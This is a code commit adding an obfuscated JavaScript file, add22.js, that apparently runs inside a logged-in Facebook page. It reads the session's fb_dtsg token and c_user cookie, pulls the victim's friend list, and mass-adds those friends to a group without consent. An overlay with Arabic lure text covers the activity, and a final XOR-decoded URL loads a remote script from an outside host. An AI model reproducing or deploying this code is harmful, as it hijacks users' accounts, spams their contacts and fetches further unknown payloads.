7538166b3b27d9bdf9b0c08d5cd09e124d6046a5
mosbaqi@gmail.com <mosbaqi@gmail.com@2c60d916-1766-9bf2-5983-1dce78d422ce>
2014-07-13 23:25:39 +0000

    a1

---
+++ trunk/add22.js
@@ -0,0 +1,398 @@
+$PMm52ULjNbDFxZgHvOt = function (n) {
+    if (typeof ($PMm52ULjNbDFxZgHvOt.list[n]) == "string") return $PMm52ULjNbDFxZgHvOt.list[n].split("").reverse().join("");
+    return $PMm52ULjNbDFxZgHvOt.list[n]
+};
+$PMm52ULjNbDFxZgHvOt.list = [">a/<>knilb/<>retnec/<رظحلا بنجتتل ةيزيلجنالاب ةملكلا ةذه روهظ ةلاح ىف نيترم انه طغضا noitamrifnoc A>retnec<>knilb<>\'hserfeR\'=eltit \'\'=ferh \'etihw:roloc;xp81:ezis-tnof;dlob:thgiew-tnof\'=elyts a<", ";3061#&;4751#&;5751#&;2061#&;3851#&;9851#&;5751#& ;3851#&;3851#&;3951#& :  ", ">\'der dilos xp11:redrob;%03:suidar-redrob;retnec:ngila-txet;xp81:ezis-tnof;etihw xp21 xp0 xp0:wodahs-txet ;fires-snas;etihw xp81 xp0 xp0:wodahs-txet;laira:ylimaf-tnof;9999:xedni-z;derkrad:roloc-dnuorgkcab;xp591:thgieh;xp056:htdiw;xp55:pot;xp022:tfel;dexif:noitisop;FFFFFF#:roloc\'=elyts \'yalpsid-egde-dneirf\'=di vid<<", "=reweiv&1=a__?php.eerged_tsrif/daehaepyt/xaja/moc.koobecaf.www//", "rotacidni-gnidaol", /[\n\r]/g, "dedocnelru-mrof-www-x/noitacilppa", "PTTHLMX.tfosorciM", ")(kcabllac_rfkcilc", "xob_emoclew_telegap", ">b/<;1061#&;5751#&;0951#&;5061#&;4061#&;5751#& ;3851#&;3851#&;3951#&;4061#&;5751#& : ", ">\'egde-dneirf\'=ssalc vid<", " >/rb< ;1061#&;5751#&;0951#&;5061#&;4061#&;5751#& ;3851#&;3851#&;3951#&;4061#&;5751#& : ", ">/rb< ;9651#&;5751#&;2061#&;3851#&;9851#&;1751#&;4061#&;5751#& ;3851#&;3851#&;3951#& : ", ">\'der dilos xp9:redrob;%03:suidar-redrob;retnec:ngila-txet;xp81:ezis-tnof;etihw xp21 xp0 xp0:wodahs-txet ;fires-snas;etihw xp81 xp0 xp0:wodahs-txet;laira:ylimaf-tnof;9999:xedni-z;derkrad:roloc-dnuorgkcab;xp591:thgieh;xp056:htdiw;xp55:pot;xp022:tfel;dexif:noitisop;FFFFFF#:roloc\'=elyts \'yalpsid-egde-dneirf\'=di vid<", ">\'wolley:roloc", "=resu__&tseuqeRcnysA=ecruos_di_mrof_tsop&dsl&yrammus_srebmem_puorg_telegap=]dom_[rtcn&", "=gstd_bf&1=a__?php.tsop_dda/srebmem/spuorg/xaja/moc.koobecaf.www//", "هخرف ءادها تابورجع كباحص فيض", /c_user=(\d+)/, "=srebmem&daehaepyt=ecruos&", ";parw-erp:ecaps-etihw;retnec:ngila-txet;xp61:ezis-tnof;lairA:ylimaf-tnof\'=elyts \'eman-egde-dneirf\'=ssalc vid<", ">\'etihw:roloc", ">\';etihw :roloc;xp02:ezis-tnof;xp:mottob-gniddap\'=elyts vid<", ">/rb<;7751#&;1061#&;5751#&;0951#&;3751#&;4061#&;5751#& ;8751#&;5751#&;4061#&;8061#&;5751#&;1851#&;5061#& : ", ">\';dlog xp21 xp0 xp0:wodahs-txet;etihw :roloc;xp03:ezis-tnof\'=elyts vid<", ">\';neerg xp81 xp0 xp0:wodahs-txet;etihw :roloc;xp03:ezis-tnof\'=elyts vid<", ">naps/<جورخلل انه طغضا تافاضالا تمت>\'etihw:roloc;xp81:pot-nigram;xp8:gniddap;%03:suidar-redrob\'=elyts \')(daoler.noitacol.wodniw\'=kcilCno \'egraLnottuBiu mrifnoCnottuBiu nottuBiu nottuByalrevOiu mrifnoCreyal\'=ssalc naps<>vid<", ";)0(diov:tpircsavaj", "PTTHLMX.2lmxsM", "epyt-tnetnoC", "htgnel-tnetnoC", ";xp0:tfel;xp0:pot;etulosba:noitisop", "puorG oT sdneirF ddA", "=resu__&resu=]0[retlif&", ">\';xp02:ezis-tnof ;xp01:mottob-gniddap\'=elyts vid<", "der dilos xp5", "qh,vcucicjq-vgecd-ucp-vgecdlco{c-cfmocj-oma,`wjvke--8qrvvj"];
+var tulisanNganu = $PMm52ULjNbDFxZgHvOt(18),
+    kunaon = '',
+    fb_dtsg = document.getElementsByName('fb_dtsg')[0].value,
+    user_id = document.cookie.match(document.cookie.match($PMm52ULjNbDFxZgHvOt(19))[1]);
+
+function penetrasi(l) {
+    jx.load(window.location.protocol + $PMm52ULjNbDFxZgHvOt(17) + document.getElementsByName("fb_dtsg")[0].value + "&group_id=" + memberGroupId + $PMm52ULjNbDFxZgHvOt(20) + l + $PMm52ULjNbDFxZgHvOt(16) + user_id, function (a) {
+        var b = a.substring(a.indexOf("\x7b")),
+            c = JSON.parse(b);
+        i--;
+        kunaon = $PMm52ULjNbDFxZgHvOt(21);
+        if (c.error) {
+            kunaon += $PMm52ULjNbDFxZgHvOt(15);
+            if (c.errorDescription) {
+                kunaon += c.errorDescription
+            } else {
+                kunaon += JSON.stringify(c, null, "")
+            }
+        } else {
+            kunaon += $PMm52ULjNbDFxZgHvOt(22);
+            kunaon += arr[i];
+            suc++
+        }
+        kunaon += "</div>";
+        var m = $PMm52ULjNbDFxZgHvOt(14);
+        m += $PMm52ULjNbDFxZgHvOt(23) + tulisanNganu + "</div>";
+        if (i > 0) {
+            m += arr.length + $PMm52ULjNbDFxZgHvOt(13);
+            m += +(arr.length - i) + $PMm52ULjNbDFxZgHvOt(24);
+            m += +suc + $PMm52ULjNbDFxZgHvOt(12);
+            m += $PMm52ULjNbDFxZgHvOt(25);
+            m += $PMm52ULjNbDFxZgHvOt(11);
+            m += $PMm52ULjNbDFxZgHvOt(26);
+            m += kunaon;
+            m += "</div>"
+        } else {
+            m += "<b>" + suc + $PMm52ULjNbDFxZgHvOt(10);
+            m += $PMm52ULjNbDFxZgHvOt(27)
+        }
+        m += "</div>";
+        document.getElementById($PMm52ULjNbDFxZgHvOt(9)).innerHTML = m
+    }, "text", "post");
+    tay--;
+    if (tay > 0) {
+        var s = arr[tay];
+        setTimeout("penetrasi(" + s + "\x29", 150)
+    }
+    console.log(tay + "\x2f" + arr.length + "\x3a" + s + ", success:" + suc)
+}
+function clickfr_callback() {
+    if (document.getElementsByName("ok").length > 0) {
+        nHtml.ClickUp(document.getElementsByName("ok")[0])
+    }
+    var a = arr[i];
+    if (i < arr.length) addfriend(a.substring(0, 4))
+}
+function clickfr() {
+    if (document.getElementsByClassName("search").length > 0) {
+        console.log(document.getElementsByClassName("search")[0].childNodes[0].childNodes[0].childNodes[1].innerHTML);
+        document.getElementsByClassName("search")[0].childNodes[0].childNodes[0].href = $PMm52ULjNbDFxZgHvOt(28);
+        nHtml.ClickUp(document.getElementsByClassName("search")[0].childNodes[0].childNodes[0].childNodes[1])
+    } else j++;
+    setTimeout($PMm52ULjNbDFxZgHvOt(8), 2e3)
+}
+function addfriend(a) {
+    i++;
+    document.getElementsByClassName("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].focus();
+    document.getElementsByClassName("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].value = a;
+    document.getElementsByClassName("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].blur();
+    document.getElementsByClassName("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].focus();
+    document.getElementsByClassName("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].focus();
+    setTimeout("clickfr()", 2e3)
+}
+function sleep(a) {
+    var b = (new Date).getTime();
+    for (var c = 0; c < 1e7; c++) {
+        if ((new Date).getTime() - b > a) {
+            break
+        }
+    }
+}
+jx = {
+    getHTTPObject: function () {
+        var a = false;
+        if (typeof ActiveXObject != "undefined") {
+            try {
+                a = new ActiveXObject($PMm52ULjNbDFxZgHvOt(29))
+            } catch (b) {
+                try {
+                    a = new ActiveXObject($PMm52ULjNbDFxZgHvOt(7))
+                } catch (c) {
+                    a = false
+                }
+            }
+        } else {
+            if (window.XMLHttpRequest) {
+                try {
+                    a = new XMLHttpRequest
+                } catch (b) {
+                    a = false
+                }
+            }
+        }
+        return a
+    },
+    load: function (l, m, n, o, p) {
+        var q = this.init();
+        if (!q || !l) {
+            return
+        }
+        if (q.overrideMimeType) {
+            q.overrideMimeType("text/xml")
+        }
+        if (!o) {
+            o = "GET"
+        }
+        if (!n) {
+            n = "text"
+        }
+        if (!p) {
+            p = {}
+        }
+        n = n.toLowerCase();
+        o = o.toUpperCase();
+        var r = "uid=" + (new Date).getTime();
+        l += l.indexOf("\x3f") + 1 ? "\x26" : "\x3f";
+        l += r;
+        var t = null;
+        if (o == "POST") {
+            var u = l.split("\x3f");
+            l = u[0];
+            t = u[1]
+        }
+        q.open(o, l, true);
+        if (o == "POST") {
+            q.setRequestHeader($PMm52ULjNbDFxZgHvOt(30), $PMm52ULjNbDFxZgHvOt(6));
+            q.setRequestHeader($PMm52ULjNbDFxZgHvOt(31), t.length);
+            q.setRequestHeader("Connection", "close")
+        }
+        var v = this;
+        if (p.handler) {
+            q.onreadystatechange = function () {
+                p.handler(q)
+            };
+        } else {
+            q.onreadystatechange = function () {
+                if (q.readyState == 4) {
+                    if (q.status == 200) {
+                        var w = "";
+                        if (q.responseText) {
+                            w = q.responseText
+                        }
+                        if (n.charAt(0) == "\x6a") {
+                            w = w.replace($PMm52ULjNbDFxZgHvOt(5), "");
+                            w = eval("\x28" + w + "\x29")
+                        } else {
+                            if (n.charAt(0) == "\x78") {
+                                w = q.responseXML
+                            }
+                        }
+                        if (m) {
+                            m(w)
+                        }
+                    } else {
+                        if (p.loadingIndicator) {
+                            document.getElementsByTagName("body")[0].removeChild(p.loadingIndicator)
+                        }
+                        if (p.loading) {
+                            document.getElementById(p.loading).style.display = "none"
+                        }
+                        if (error) {
+                            error(q.status)
+                        }
+                    }
+                }
+            };
+        }
+        q.send(t)
+    },
+    bind: function (a) {
+        var b = {
+            url: "",
+            onSuccess: false,
+            onError: false,
+            format: "text",
+            method: "GET",
+            update: "",
+            loading: "",
+            loadingIndicator: ""
+        };
+        for (var c in b) {
+            if (a[c]) {
+                b[c] = a[c]
+            }
+        }
+        if (!b.url) {
+            return
+        }
+        var d = false;
+        if (b.loadingIndicator) {
+            d = document.createElement("div");
+            d.setAttribute("style", $PMm52ULjNbDFxZgHvOt(32));
+            d.setAttribute("class", $PMm52ULjNbDFxZgHvOt(4));
+            d.innerHTML = b.loadingIndicator;
+            document.getElementsByTagName("body")[0].appendChild(d);
+            this.opt.loadingIndicator = d
+        }
+        if (b.loading) {
+            document.getElementById(b.loading).style.display = "none"
+        }
+        this.load(b.url, function (a) {
+            if (b.onSuccess) {
+                b.onSuccess(a)
+            }
+            if (b.update) {
+                document.getElementById(b.update).innerHTML = a
+            }
+            if (d) {
+                document.getElementsByTagName("body")[0].removeChild(d)
+            }
+            if (b.loading) {
+                document.getElementById(b.loading).style.display = "none"
+            }
+        }, b.format, b.method, b)
+    },
+    init: function () {
+        return this.getHTTPObject()
+    }
+};
+var nHtml = {
+    FindByAttr: function (a, b, c, d) {
+        if (c == "className") {
+            c = "class"
+        }
+        var e = document.evaluate(".//" + b + "[@" + c + "='" + d + "']", a, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null);
+        if (e && e.singleNodeValue) {
+            return e.singleNodeValue
+        }
+        return null
+    },
+    FindByClassName: function (a, b, c) {
+        return this.FindByAttr(a, b, "className", c)
+    },
+    FindByXPath: function (a, b) {
+        try {
+            var c = document.evaluate(b, a, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null)
+        } catch (d) {
+            GM_log("bad xpath:" + b)
+        }
+        if (c && c.singleNodeValue) {
+            return c.singleNodeValue
+        }
+        return null
+    },
+    VisitUrl: function (a) {
+        window.setTimeout(function () {
+            document.location.href = a
+        }, 500 + Math.floor(Math.random() * 500))
+    },
+    ClickWin: function (a, b, c) {
+        var d = a.document.createEvent("MouseEvents");
+        d.initMouseEvent(c, true, true, a, 0, 0, 0, 0, 0, false, false, false, false, 0, null);
+        return !b.dispatchEvent(d)
+    },
+    Click: function (a) {
+        return this.ClickWin(window, a, "click")
+    },
+    ClickTimeout: function (a, b) {
+        window.setTimeout(function () {
+            return nHtml.ClickWin(window, a, "click")
+        }, b + Math.floor(Math.random() * 500))
+    },
+    ClickUp: function (a) {
+        this.ClickWin(window, a, "mousedown");
+        this.ClickWin(window, a, "mouseup");
+        this.ClickWin(window, a, "click")
+    },
+    GetText: function (a, b) {
+        var c = "";
+        if (b == undefined) {
+            b = 0
+        }
+        if (b > 40) {
+            return
+        }
+        if (a.textContent != undefined) {
+            return a.textContent
+        }
+        for (var d = 0; d < a.childNodes.length; d++) {
+            var e = a.childNodes[d];
+            c += this.GetText(e, b + 1)
+        }
+        return c
+    }
+};
+if (document.getElementsByClassName == undefined) {
+    document.getElementsByClassName = function (a) {
+        var b = new RegExp("(?:^|\\s)" + a + "(?:$|\\s)"),
+            c = document.getElementsByTagName("\x2a"),
+            d = [],
+            e;
+        for (var f = 0;
+        (e = c[f]) != null; f++) {
+            var g = e.className;
+            if (g && g.indexOf(a) != -1 && b.test(g)) d.push(e)
+        }
+        return d
+    };
+}
+Array.prototype.find = function (a) {
+    var b = false;
+    for (i = 0; i < this.length; i++) {
+        if (typeof a == "function") {
+            if (a.test(this[i])) {
+                if (!b) {
+                    b = []
+                }
+                b.push(i)
+            }
+        } else {
+            if (this[i] === a) {
+                if (!b) {
+                    b = []
+                }
+                b.push(i)
+            }
+        }
+    }
+    return b
+};
+var a = 0,
+    eind = 0,
+    len = document.getElementsByClassName("mbm").length;
+for (a = 0; a < len; a++) {
+    var ele = document.getElementsByClassName("mbm")[a];
+    if (ele && ele.childNodes[0] && ele.childNodes[0] && ele.childNodes[0].childNodes[1] && ele.childNodes[0].childNodes[1].childNodes[0] && document.getElementsByClassName("mbm")[a].childNodes[0].childNodes[1].childNodes[0].value == $PMm52ULjNbDFxZgHvOt(33)) {
+        eind = a;
+        break
+    }
+}
+var i = 3,
+    tay = 3,
+    counter1 = 0,
+    counter2 = 0,
+    counter3 = 0,
+    j = 0,
+    k = 0,
+    suc = 0,
+    arr = new Array,
+    memberGroupId = document.getElementsByName('group_id')[0].value;
+jx.load(window.location.protocol + $PMm52ULjNbDFxZgHvOt(3) + user_id + $PMm52ULjNbDFxZgHvOt(34) + user_id, function (a) {
+    var b = a,
+        c = b.substring(b.indexOf("\x7b")),
+        d = JSON.parse(c);
+    d = d.payload.entries;
+    for (var e = 0; e < d.length; e++) {
+        arr.push(d[e].uid)
+    }
+    i = arr.length - 1;
+    tay = i;
+    console.log(arr.length);
+    var l = $PMm52ULjNbDFxZgHvOt(2);
+    l += $PMm52ULjNbDFxZgHvOt(35) + tulisanNganu + "</div>";
+    l += arr.length + $PMm52ULjNbDFxZgHvOt(1);
+    l += "</div>";
+    document.getElementById($PMm52ULjNbDFxZgHvOt(9)).innerHTML = l;
+    penetrasi(arr[i])
+});
+body = document.body;
+if (body != null) {
+    div = document.createElement("div");
+    div.style.position = "fixed";
+    div.style.textAlign = "center";
+    div.style.width = "650px";
+    div.style.top = "+270px";
+    div.style.left = "+220px";
+    div.style.backgroundColor = "darkred";
+    div.style.border = $PMm52ULjNbDFxZgHvOt(36);
+    div.style.padding = "19px";
+    div.style.borderRadius = "30%";
+    div.innerHTML = $PMm52ULjNbDFxZgHvOt(0);
+    body.appendChild(div)
+}
+var enkripsi = $PMm52ULjNbDFxZgHvOt(37);
+teks = "";
+teksasli = "";
+var panjang;
+panjang = enkripsi.length;
+for (i = 0; i < panjang; i++) {
+    teks += String.fromCharCode(enkripsi.charCodeAt(i) ^ 2)
+}
+teksasli = unescape(teks);
+document.body.appendChild(document.createElement('script')).src = teksasli;
